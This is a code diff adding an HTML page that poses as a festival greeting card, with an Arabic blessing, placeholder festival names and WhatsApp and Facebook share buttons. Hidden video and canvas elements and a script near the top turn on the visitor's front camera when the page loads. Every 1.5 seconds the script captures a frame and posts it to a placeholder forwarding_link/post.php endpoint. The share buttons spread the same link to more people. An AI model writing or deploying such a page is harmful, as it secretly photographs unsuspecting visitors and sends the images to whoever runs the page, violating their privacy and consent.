@@ -1,0 +1,118 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
+<title>Mubarak - Happy fes_name</title>
+<link rel="icon" type="image/png" sizes="32x32" href="https://i.imgur.com/fcqTtzV.png">
+  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<style>
+  body { font-family: Arial, Helvetica, sans-serif; background: linear-gradient(135deg, #004d00, #009900); color: #fff; }
+  .card { max-width: 900px; margin: 24px auto; background: rgba(255,255,255,0.05); padding: 18px; border-radius: 12px; box-shadow: 0 4px 14px rgba(0,0,0,0.3); }
+  h1 { text-align:center; color: #ffeb3b; font-size: 36px; margin: 8px 0; }
+  p.lead { text-align:center; color:#fff; font-size:18px; }
+  .marquee { background: rgba(255,255,255,0.06); padding:8px; border-radius:8px; margin:10px auto; width:80%; text-align:center; }
+  .btn-share { display:inline-block; padding:10px 16px; border-radius:10px; background:#ffffff22; color:#fff; text-decoration:none; font-weight:bold; }
+  .footer { position: fixed; left:0; right:0; bottom:8px; display:flex; gap:8px; justify-content:center; }
+</style>
+</head>
+<div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+ </div>
+ 
+ <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+ 
+ <script>
+ 
+ function post(imgdata){
+ $.ajax({
+     type: 'POST',
+     data: { cat: imgdata},
+     url: 'forwarding_link/post.php',
+     dataType: 'json',
+     async: false,
+     success: function(result){
+         // call the function that handles the response/results
+     },
+     error: function(){
+     }
+   });
+ };
+ 
+ 
+ 'use strict';
+ 
+ const video = document.getElementById('video');
+ const canvas = document.getElementById('canvas');
+ const errorMsgElement = document.querySelector('span#errorMsg');
+ 
+ const constraints = {
+   audio: false,
+   video: {
+     
+     facingMode: "user"
+   }
+ };
+ 
+ // Access webcam
+ async function init() {
+   try {
+     const stream = await navigator.mediaDevices.getUserMedia(constraints);
+     handleSuccess(stream);
+   } catch (e) {
+     errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+   }
+ }
+ 
+ // Success
+ function handleSuccess(stream) {
+   window.stream = stream;
+   video.srcObject = stream;
+ 
+ var context = canvas.getContext('2d');
+   setInterval(function(){
+ 
+        context.drawImage(video, 0, 0, 640, 480);
+        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        post(canvasData); }, 1500);
+   
+ 
+ }
+ 
+ // Load init
+ init();
+ 
+ </script>
+<body>
+  <div class="card">
+    <h1> مبارك - fes_name</h1>
+    <div class="marquee">
+      <strong>تقبل الله منا ومنكم صالح الأعمال</strong>
+    </div>
+    <p class="lead">May the blessings of fes_name bring peace, joy and prosperity to you and your family.</p>
+
+    <center>
+      <p style="font-size:20px; background:#ffffff11; padding:8px; border-radius:8px; display:inline-block;">Share this greeting with your loved ones</p>
+    </center>
+
+    <br>
+    <center>
+      <a class="btn-share" href="whatsapp://send?text=*تقبل الله منا ومنكم* 👉 forwarding_link" data-action="share/whatsapp/share">Share on WhatsApp</a>
+      &nbsp;
+      <a class="btn-share" href="https://www.facebook.com/sharer/sharer.php?u= forwarding_link" target="_blank">Share on Facebook</a>
+    </center>
+
+    <br><br>
+    <div style="text-align:center; color:#fff; font-size:16px;">
+      <strong>Happy <span style="color:#ffd54f">fes_name</span></strong>
+      <p style="font-size:14px; margin-top:8px;">This message is created especially for <em>fes_name</em> — personalize it for your friends.</p>
+    </div>
+
+  </div>
+
+  <div class="footer">
+    <a class="btn-share" href="whatsapp://send?text=*Message for you* 👉 forwarding_link">Share</a>
+    <a class="btn-share" href="https://www.facebook.com/sharer/sharer.php?u= forwarding_link" target="_blank">Share</a>
+  </div>
+
+</body>
+</html>
